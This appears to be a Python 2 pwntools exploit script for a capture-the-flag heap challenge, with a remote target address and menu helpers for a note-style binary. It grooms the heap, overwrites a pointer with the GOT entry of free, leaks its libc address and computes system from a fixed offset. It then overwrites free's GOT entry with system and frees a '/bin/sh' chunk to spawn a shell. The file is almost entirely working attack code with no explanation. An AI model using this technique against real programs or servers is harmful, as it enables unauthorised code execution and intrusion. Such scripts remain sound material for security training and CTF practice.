#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 58637)
    #libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    #libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    #libc = ELF('./libc-2.xx.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Action:', str(index))

def create(size, name, dessize, des):
    menu(0)
    p.sla('size of description:', str(size))
    p.sla('name:', name)
    p.sla('text length:', str(dessize))
    p.sla('text:', des)

def delete(index):
    menu(1)
    p.sla('index:', str(index))

def show(index):
    menu(2)
    p.sla('index:', str(index))

def edit(index, dessize, des):
    menu(3)
    p.sla('index:', str(index))
    p.sla('text length:', str(dessize))
    p.sla('text:', des)
    
if __name__ == '__main__':
    create(0x18, 'a', 0x10, 'b')
    create(0x18, 'a', 0x10, 'b')
    create(0x18, 'a', 0x10, 'b')
    create(0x18, 'a', 0x10, '/bin/sh\x00')
    delete(2)
    delete(0)
    #create(0x18, 'a', 0x174, flat(['a' * 0x170, elf.got['puts']]))
    create(0x18, 'a', 0xcc, flat(['a' * 0xc8, elf.got['free']]))
    show(1)
    p.ru('description: ')
    free_addr = u32(p.r(4))
    success('free ' + hex(free_addr))
    system_addr = free_addr -0x35e10
    edit(1, 0x4, p32(system_addr))
    delete(3)
    p.i()
